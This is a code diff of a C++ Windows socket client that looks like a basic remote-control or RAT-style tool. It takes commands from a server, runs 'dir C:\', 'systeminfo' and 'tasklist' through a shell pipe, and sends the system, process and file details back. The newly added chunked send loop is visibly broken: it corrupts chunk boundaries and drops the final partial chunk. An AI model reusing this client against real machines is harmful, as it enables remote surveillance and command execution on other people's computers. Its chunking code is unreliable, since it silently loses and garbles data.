@@ -12,6 +12,12 @@
 #include <iostream>
 #include <sstream>
 #include <vector>
+#include <cstdio>
+#include <iostream>
+#include <memory>
+#include <stdexcept>
+#include <string>
+#include <array>
 
 #pragma comment (lib, "Ws2_32.lib")
 
@@ -20,6 +26,8 @@
 void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer);
 void listFiles(std::vector<char>& outputBuffer, std::string directory = "C:\\*");
 void printSystem(std::vector<char>& outputBuffer);
+void printTasks(std::vector<char>& outputBuffer);
+std::string exec(const char* cmd);
 
 int __cdecl main(void)
 {
@@ -33,7 +41,6 @@ int __cdecl main(void)
 	struct addrinfo *result = NULL;
 	struct addrinfo hints;
 
-	int iSendResult;
 
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -99,7 +106,8 @@ int __cdecl main(void)
 		WSACleanup();
 		return 1;
 	}
-
+	std::stringstream output;
+	char newbuffer[4096 * 2];
 	// No longer need listening socket
 	closesocket(ListenSocket);
 	// Receive until the peer shuts down the connection
@@ -122,7 +130,17 @@ int __cdecl main(void)
 			std::cout << std::endl;
 			//If the command asks for a result (at this stage, all will), the result needs to be sent back 
 			//to the server
-			iResult = send(ServerSocket, outputBuffer.data(), outputBuffer.size(), 0);
+			for (int i = 0; i < outputBuffer.size(); i++)
+			{
+				newbuffer[i % sizeof(newbuffer)] = outputBuffer[i];
+				if ((i % sizeof(newbuffer)) == 0 && i != 0)
+				{
+					std::cout << newbuffer << std::endl;
+					iResult = send(ServerSocket, newbuffer, sizeof(newbuffer), 0);
+				}
+			}
+			char end = '\0';
+			iResult = send(ServerSocket, &end, sizeof(end), 0);
 		}
 		//If 0 bytes has been sent, then the server has shutdown and so should the client
 		else
@@ -156,57 +174,60 @@ void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer)
 		//Calls the function to list files based on a directory provided
 		//C:\ is used as a default
 		//The outputBuffer has all the files and directory information listed
-		listFiles(outputBuffer);
+		printTasks(outputBuffer);
 		break;
 	}
 }
 //Function to build a basic file structure outline of the client machine
 void listFiles(std::vector<char>& outputBuffer, std::string directory)
 {
-	WIN32_FIND_DATA fileData;
-	__int64 filesize = 0;
-	HANDLE hFind = INVALID_HANDLE_VALUE;
-	//Locates the file information for the specificed directory
-	//Default will be the C:\ Drive
-	hFind = FindFirstFile(directory.c_str(), &fileData);
-	do
+	//String to build the output
+	std::string build;
+	build = exec("dir C:\\ 2>&1");
+	for (auto& element : build)
 	{
-		//First section handles directories
-		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-		{
-			//String used to build the line showing the directory information
-			std::string build;
-			build = build + "  " + fileData.cFileName + "   <DIR>\n";
-			for (auto& element : build)
-			{
-				//All characters are added into the buffer vector
-				outputBuffer.push_back(element);
-			}
-		}
-		//Next section handles files
-		else
-		{
-			//Type to hold file size, it is recorded in bytes
-			LARGE_INTEGER data;
-			data.LowPart = fileData.nFileSizeLow;
-			data.HighPart = fileData.nFileSizeHigh;
-			filesize = data.QuadPart;
-			//String used to build the line showing the file information
-			std::string build;
-			build = build + "  " + fileData.cFileName + "   ";
-			//Converts the file size to a type that can be printed
-			build += static_cast<std::ostringstream*>(&(std::ostringstream() << filesize))->str();
-			build += " bytes\n";
-			for (auto& element : build)
-			{
-				//All characters are added into the buffer vector
-				outputBuffer.push_back(element);
-			}
-		}
-		//Once there are no files to output, return the function
-	} while (FindNextFile(hFind, &fileData) != 0);
+		//All characters are added into the buffer vector
+		outputBuffer.push_back(element);
+	}
 }
+//Function that will return the system information of the client
 void printSystem(std::vector<char>& outputBuffer)
 {
-
+	//String to build the output
+	std::string build;
+	build = exec("systeminfo 2>&1");
+	for (auto& element : build)
+	{
+		//All characters are added into the buffer vector
+		outputBuffer.push_back(element);
+	}
+}
+//Function that will return the processes of the client
+void printTasks(std::vector<char>& outputBuffer)
+{
+	//String to build the output
+	std::string build;
+	build = exec("tasklist 2>&1");
+	for (auto& element : build)
+	{
+		//All characters are added into the buffer vector
+		outputBuffer.push_back(element);
+	}
+}
+//Function for execution the function on the client
+std::string exec(const char* cmd) 
+{
+	std::array<char, 256> buffer;
+	std::string result;
+	//Opens a pipe for the purposes of running the cmd
+	std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
+	if (!pipe) 
+		throw std::runtime_error("popen() failed!");
+	//While there is data to grab, process that output into the string
+	while (!feof(pipe.get())) 
+	{
+		if (fgets(buffer.data(), 256, pipe.get()) != nullptr)
+			result += buffer.data();
+	}
+	return result;
 }
